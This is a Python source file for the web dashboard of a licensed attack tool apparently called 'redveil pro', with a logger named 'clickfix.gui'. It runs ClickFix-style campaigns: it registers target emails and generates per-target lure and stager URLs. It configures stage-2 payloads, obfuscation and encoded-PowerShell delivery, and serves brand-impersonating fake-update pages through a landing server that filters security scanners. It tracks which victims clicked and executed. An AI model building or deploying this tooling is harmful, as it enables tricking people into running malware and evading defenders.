# language: Python 3.11+, file: cf/gui.py
# *redveil pro gui — local web dashboard over aiohttp, zero extra deps*
from __future__ import annotations

import asyncio
import json
import logging
import secrets
import time
import webbrowser
from collections import deque
from pathlib import Path
from typing import Any

from .license import LicenseError, effective, load, save
from .server import LandingServer
from .store import Store
from .techniques import TECHNIQUES

LOG = logging.getLogger("clickfix.gui")

GUI_HTML = Path(__file__).with_name("gui.html")


def _json(data: Any, status: int = 200) -> Any:
    from aiohttp import web

    return web.json_response(data, status=status)


class RedveilGUI:
    """Local-only dashboard. Binds to 127.0.0.1 by default, token-protected
    unless --no-auth. The landing server is controlled from here."""

    def __init__(
        self,
        store: Store,
        host: str = "127.0.0.1",
        port: int = 8888,
        auth: bool = True,
    ) -> None:
        from aiohttp import web

        self.web = web
        self.store = store
        self.host = host
        self.port = port
        self.auth = auth
        self.token = secrets.token_urlsafe(16)
        self._runner: Any = None
        self._site: Any = None
        self._landing: LandingServer | None = None
        self._landing_task: Any = None
        # live server mode: one bounded queue per open event stream, a hit
        # pump that sleeps while nobody watches, dedupe across its window
        self._subs: set[asyncio.Queue[dict[str, Any]]] = set()
        self._pump_task: Any = None
        self._started_at = 0.0
        self._seen: set[str] = set()
        self._seen_q: deque[str] = deque()

    # ─── auth ───
    def _check_token(self, request: Any) -> bool:
        if not self.auth:
            return True
        supplied = (
            request.query.get("token")
            or request.headers.get("X-Redveil-Token")
            or ""
        )
        return secrets.compare_digest(supplied, self.token)

    # ─── off-loop store access ───
    # same rule as the landing server: sqlite rides a worker thread, never
    # the event loop, or one commit stalls every dashboard request
    async def _store(self, fn: Any, *args: Any, **kwargs: Any) -> Any:
        return await asyncio.to_thread(fn, *args, **kwargs)

    # ─── live events (sse) ───
    # a slow viewer drops its oldest event instead of stalling the pump or
    # whichever handler happens to broadcast into its queue
    def broadcast(self, kind: str, data: dict[str, Any] | None = None) -> None:
        if not self._subs:
            return
        evt: dict[str, Any] = {"type": kind, "ts": time.time()}
        if data:
            evt.update(data)
        for q in list(self._subs):
            try:
                q.put_nowait(evt)
            except asyncio.QueueFull:
                try:
                    q.get_nowait()
                except asyncio.QueueEmpty:
                    pass
                try:
                    q.put_nowait(evt)
                except asyncio.QueueFull:
                    pass

    async def _pump(self) -> None:
        # zero store work while no stream is open; one scan per second while
        # a dashboard is watching
        while True:
            if not self._subs:
                await asyncio.sleep(0.5)
                continue
            try:
                await self._scan_hits()
            except Exception:  # noqa: BLE001
                LOG.debug("hit pump failed", exc_info=True)
            await asyncio.sleep(1.0)

    async def _scan_hits(self) -> None:
        # 5s overlap plus dedupe keys: a hit inside the window broadcasts
        # once, and the seen set is capped so a long session stays flat
        cutoff = time.time() - 5.0
        camps = await self._store(self.store.list_campaigns)
        for camp in camps[:200]:
            for hit in await self._store(
                self.store.campaign_hits_since, camp["id"], cutoff
            ):
                key = "|".join(
                    str(hit.get(k, ""))
                    for k in ("token", "kind", "created_at", "ip")
                )
                if key in self._seen:
                    continue
                if len(self._seen) >= 512:
                    self._seen.discard(self._seen_q.popleft())
                self._seen.add(key)
                self._seen_q.append(key)
                self.broadcast(
                    "hit",
                    {
                        "campaign": camp["name"],
                        "token": str(hit.get("token", "")),
                        "kind": str(hit.get("kind", "")),
                        "ip": str(hit.get("ip", "")),
                        "ua": str(hit.get("ua", ""))[:80],
                        "hit_ts": float(hit.get("created_at") or 0),
                    },
                )

    async def api_events(self, request: Any) -> Any:
        from aiohttp import web

        resp = web.StreamResponse(status=200)
        resp.content_type = "text/event-stream"
        resp.headers["Cache-Control"] = "no-cache"
        resp.headers["X-Accel-Buffering"] = "no"
        await resp.prepare(request)
        q: asyncio.Queue[dict[str, Any]] = asyncio.Queue(maxsize=256)
        self._subs.add(q)
        try:
            await resp.write(b": connected\n\n")
            while True:
                try:
                    evt = await asyncio.wait_for(q.get(), timeout=15.0)
                except asyncio.TimeoutError:
                    # comment frames keep proxies and idle timers honest
                    await resp.write(b": ping\n\n")
                    continue
                await resp.write(
                    f"data: {json.dumps(evt, separators=(',', ':'))}\n\n"
                    .encode()
                )
        except (ConnectionResetError, ConnectionError, RuntimeError):
            pass
        except asyncio.CancelledError:
            # server shutdown — the finally below still detaches the queue
            raise
        finally:
            self._subs.discard(q)
        return resp

    async def api_status(self, request: Any) -> Any:
        from . import __version__

        now = time.time()
        return _json(
            {
                "version": __version__,
                "host": self.host,
                "port": self.port,
                "auth": self.auth,
                "uptime": (
                    round(now - self._started_at, 1) if self._started_at else 0.0
                ),
                "landing": "up" if self._landing else "down",
                "landing_port": self._landing.port if self._landing else None,
                "viewers": len(self._subs),
                "server_time": now,
            }
        )

    # ─── api handlers ───
    async def api_overview(self, request: Any) -> Any:
        camps = await self._store(self.store.list_campaigns)
        total_targets = 0
        funnel = {"created": 0, "clicked": 0, "delivered": 0, "executed": 0}
        recent_hits: list[dict[str, Any]] = []
        cutoff = time.time() - 86400
        for camp in camps:
            st = await self._store(self.store.status, camp["id"])
            total_targets += int(st.get("targets", 0))
            for k, v in (st.get("by_status") or {}).items():
                if k in funnel:
                    funnel[k] += int(v)
            # one JOIN per campaign replaces per-target hit queries
            for hit in await self._store(self.store.campaign_hits_since, camp["id"], cutoff):
                ts = float(hit.get("created_at") or 0)
                recent_hits.append(
                    {
                        "ts": ts,
                        "campaign": camp["name"],
                        "token": str(hit.get("token", "")),
                        "kind": str(hit.get("kind", "")),
                        "ip": str(hit.get("ip", "")),
                        "ua": str(hit.get("ua", ""))[:80],
                    }
                )
        recent_hits.sort(key=lambda r: r["ts"], reverse=True)
        lic = effective(self.store)
        return _json(
            {
                "campaigns": len(camps),
                "targets": total_targets,
                "funnel": funnel,
                "hits_24h": len(recent_hits),
                "recent_hits": recent_hits[:20],
                "landing_up": self._landing is not None,
                "landing_port": self._landing.port if self._landing else None,
                "license": lic.as_dict(),
                "server_time": time.time(),
            }
        )

    async def api_campaigns(self, request: Any) -> Any:
        if request.method == "POST":
            try:
                body = await request.json()
            except Exception:  # noqa: BLE001
                return _json({"error": "invalid json"}, 400)
            name = str(body.get("name", "")).strip()
            if not name:
                return _json({"error": "name required"}, 400)
            technique = str(body.get("technique", ""))
            kind = str(body.get("kind", ""))
            if technique and technique in TECHNIQUES:
                tech = TECHNIQUES[technique]
                if not kind and tech.kind:
                    kind = tech.kind
            meta: dict[str, Any] = {
                "kind": kind or "psenc",
                "locale": str(body.get("locale", "fr")),
                "stage2_url": str(body.get("stage2_url", "")),
                "stage2_type": str(body.get("stage2_type", "none")),
                "continue_url": str(
                    body.get("continue_url", "https://www.google.com")
                ),
                "obfuscate": bool(body.get("obfuscate", False)),
            }
            if technique:
                meta["technique"] = technique
            try:
                check = effective(self.store)
                from .license import check_quota

                check_quota(check, self.store)
            except LicenseError as exc:
                return _json({"error": str(exc)}, 403)
            cid = await self._store(
                self.store.create_campaign,
                name,
                scenario=str(body.get("scenario", "browser_update")),
                base_url=str(body.get("base_url", "")),
                meta=meta,
            )
            self.broadcast("campaign", {"id": cid, "name": name})
            return _json({"id": cid, "name": name}, 201)
        rows = []
        for camp in await self._store(self.store.list_campaigns):
            st = await self._store(self.store.status, camp["id"])
            try:
                meta = json.loads(camp.get("meta") or "{}")
                if not isinstance(meta, dict):
                    meta = {}
            except ValueError:
                meta = {}
            rows.append(
                {
                    "id": camp["id"],
                    "name": camp["name"],
                    "scenario": camp["scenario"],
                    "base_url": camp["base_url"],
                    "created_at": camp.get("created_at"),
                    "kind": meta.get("kind", ""),
                    "technique": meta.get("technique", ""),
                    "locale": meta.get("locale", ""),
                    "targets": int(st.get("targets", 0)),
                    "by_status": st.get("by_status", {}),
                }
            )
        return _json({"campaigns": rows})

    async def api_campaign_detail(self, request: Any) -> Any:
        cid = request.match_info["cid"]
        camp = await self._store(self.store.get_campaign, cid)
        if not camp:
            return _json({"error": "unknown campaign"}, 404)
        st = await self._store(self.store.status, cid)
        targets = await self._store(self.store.targets, cid)
        try:
            meta = json.loads(camp.get("meta") or "{}")
            if not isinstance(meta, dict):
                meta = {}
        except ValueError:
            meta = {}
        base = str(camp.get("base_url") or "").rstrip("/")
        from .server import settings_for

        settings = settings_for(self.store, camp)
        for t in targets:
            t["lure_url"] = f"{base}/l/{t['token']}" if base else ""
            t["stager_url"] = (
                f"{base}/s/{settings['kind']}/{t['token']}" if base else ""
            )
        return _json(
            {
                "id": cid,
                "name": camp["name"],
                "scenario": camp["scenario"],
                "base_url": base,
                "meta": meta,
                "settings": settings,
                "targets": targets,
                "status": st,
            }
        )

    async def api_targets(self, request: Any) -> Any:
        if request.method == "POST":
            try:
                body = await request.json()
            except Exception:  # noqa: BLE001
                return _json({"error": "invalid json"}, 400)
            cid = str(body.get("campaign_id", ""))
            camp = await self._store(self.store.get_campaign, cid)
            if not camp:
                return _json({"error": "unknown campaign"}, 404)
            try:
                from .license import check_quota

                check_quota(effective(self.store), self.store, cid)
            except LicenseError as exc:
                return _json({"error": str(exc)}, 403)
            email = str(body.get("email", ""))
            label = str(body.get("label", ""))
            token = await self._store(
                self.store.add_target, cid, email=email, label=label
            )
            self.broadcast("target", {"campaign_id": cid, "token": token})
            return _json({"token": token}, 201)
        cid = request.query.get("campaign_id", "")
        if not cid:
            return _json({"error": "campaign_id required"}, 400)
        return _json({"targets": await self._store(self.store.targets, cid)})

    async def api_techniques(self, request: Any) -> Any:
        surface = request.query.get("surface", "")
        category = request.query.get("category", "")
        query = request.query.get("q", "")
        rows = []
        for tech in TECHNIQUES.values():
            if surface and tech.surface != surface:
                continue
            if category and tech.category != category:
                continue
            if query and query.lower() not in f"{tech.id} {tech.name}".lower():
                continue
            d = tech.as_dict()
            d["lure_preview"] = tech.command_for("https://HOST", "TOKEN")
            rows.append(d)
        return _json({"techniques": rows})

    async def api_scenarios(self, request: Any) -> Any:
        from .lure import SCENARIOS

        rows = [
            {
                "id": k,
                "brand": v["brand"],
                "badge": v["badge"],
                "headline": v["headline"],
                "dark": v["dark"],
                "accent": v["accent"],
            }
            for k, v in SCENARIOS.items()
        ]
        return _json({"scenarios": rows})

    async def api_serve(self, request: Any) -> Any:
        if request.method == "POST":
            try:
                body = await request.json()
            except Exception:  # noqa: BLE001
                body = {}
            action = str(body.get("action", "start"))
            if action == "stop":
                if self._landing is not None:
                    await self._landing.stop()
                    self._landing = None
                self.broadcast("serve", {"landing": "down"})
                return _json({"landing": "stopped"})
            if self._landing is not None:
                return _json(
                    {"landing": "already_up", "port": self._landing.port}, 409
                )
            port = int(body.get("port", 8080))
            filter_scanners = bool(body.get("filter", True))
            landing = LandingServer(
                self.store,
                host="127.0.0.1",
                port=port,
                filter_scanners=filter_scanners,
            )
            await landing.start()
            self._landing = landing
            self.broadcast("serve", {"landing": "up", "port": port})
            return _json({"landing": "up", "port": port}, 201)
        return _json(
            {
                "landing": "up" if self._landing else "down",
                "port": self._landing.port if self._landing else None,
            }
        )

    async def api_license(self, request: Any) -> Any:
        if request.method == "POST":
            try:
                body = await request.json()
            except Exception:  # noqa: BLE001
                return _json({"error": "invalid json"}, 400)
            action = str(body.get("action", ""))
            if action == "activate":
                try:
                    p = save(str(body.get("key", "")))
                except LicenseError as exc:
                    return _json({"error": str(exc)}, 400)
                self.broadcast("license", {"action": "activate"})
                return _json({"activated": True, "path": str(p)})
            if action == "deactivate":
                from .license import deactivate

                deactivate()
                self.broadcast("license", {"action": "deactivate"})
                return _json({"deactivated": True})
        lic = load()
        if lic is None:
            lic = effective(self.store)
        return _json({"license": lic.as_dict()})

    async def api_report(self, request: Any) -> Any:
        from .report import build, csv_rows

        cid = request.match_info["cid"]
        fmt = request.query.get("format", "md")
        try:
            body = await self._store(
                csv_rows if fmt == "csv" else build, self.store, cid
            )
        except KeyError as exc:
            return _json({"error": str(exc).strip("'")}, 404)
        from aiohttp import web

        filename = f"redveil-{cid}.{fmt}"
        return web.Response(
            text=body,
            content_type="text/plain",
            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
        )

    async def index(self, request: Any) -> Any:
        from aiohttp import web

        if not self._check_token(request):
            return web.Response(status=401, text="invalid or missing token")
        try:
            html = GUI_HTML.read_text(encoding="utf-8")
        except OSError:
            return web.Response(status=500, text="gui.html missing")
        html = html.replace("__TOKEN__", self.token if self.auth else "")
        html = html.replace("__PORT__", str(self.port))
        return web.Response(text=html, content_type="text/html")

    # ─── app ───
    def _auth_middleware(self) -> Any:
        @self.web.middleware
        async def mw(request: Any, handler: Any) -> Any:
            if request.path.startswith("/api/") and not self._check_token(request):
                return _json({"error": "unauthorized"}, 401)
            return await handler(request)

        return mw

    def build_app(self) -> Any:
        web = self.web
        app = web.Application(middlewares=[self._auth_middleware()])
        app.router.add_get("/", self.index)
        app.router.add_get("/api/overview", self.api_overview)
        app.router.add_get("/api/campaigns", self.api_campaigns)
        app.router.add_post("/api/campaigns", self.api_campaigns)
        app.router.add_get("/api/campaigns/{cid}", self.api_campaign_detail)
        app.router.add_get("/api/targets", self.api_targets)
        app.router.add_post("/api/targets", self.api_targets)
        app.router.add_get("/api/techniques", self.api_techniques)
        app.router.add_get("/api/scenarios", self.api_scenarios)
        app.router.add_get("/api/serve", self.api_serve)
        app.router.add_post("/api/serve", self.api_serve)
        app.router.add_get("/api/license", self.api_license)
        app.router.add_post("/api/license", self.api_license)
        app.router.add_get("/api/report/{cid}", self.api_report)
        app.router.add_get("/api/events", self.api_events)
        app.router.add_get("/api/status", self.api_status)
        return app

    def _require_local_auth(self) -> None:
        # server-mode rule: an unauthenticated console is loopback-only —
        # --no-auth on a routable bind would expose every campaign in the db
        if self.auth or self.host in ("127.0.0.1", "::1", "localhost"):
            return
        raise ValueError(
            f"refusing to bind {self.host} without auth — drop --no-auth "
            "or keep --host 127.0.0.1"
        )

    async def start(self, open_browser: bool = True) -> None:
        self._require_local_auth()
        if self._runner is not None:
            # a second start() must not orphan the first bound site
            await self.stop()
        app = self.build_app()
        self._runner = self.web.AppRunner(app, access_log=None)
        await self._runner.setup()
        self._site = self.web.TCPSite(self._runner, self.host, self.port)
        try:
            await self._site.start()
        except OSError:
            # bind failed (EADDRINUSE...) — tear the half-up runner down so
            # stop()/retry don't double-cleanup a site that never bound
            await self._runner.cleanup()
            self._runner = None
            self._site = None
            raise
        url = self._url()
        self._started_at = time.time()
        self._seen.clear()
        self._seen_q.clear()
        self._pump_task = asyncio.create_task(self._pump())
        print(f"[+] redveil gui -> {url}")
        if self.auth:
            print(f"    token: {self.token}")
        if open_browser:
            webbrowser.open(url)

    def _url(self) -> str:
        base = f"http://{self.host}:{self.port}"
        if self.auth:
            return f"{base}/?token={self.token}"
        return base

    async def stop(self) -> None:
        # ordered teardown: pump first (it reads the store and feeds the
        # queues), then the viewers, then the landing server, then the site
        if self._pump_task is not None:
            self._pump_task.cancel()
            try:
                await self._pump_task
            except asyncio.CancelledError:
                pass
            self._pump_task = None
        self._subs.clear()
        if self._landing is not None:
            await self._landing.stop()
            self._landing = None
        if self._runner is not None:
            await self._runner.cleanup()
            self._runner = None

    async def run_forever(self, open_browser: bool = True) -> None:
        await self.start(open_browser=open_browser)
        stop = asyncio.Event()
        try:
            await stop.wait()
        except asyncio.CancelledError:
            pass
        finally:
            await self.stop()
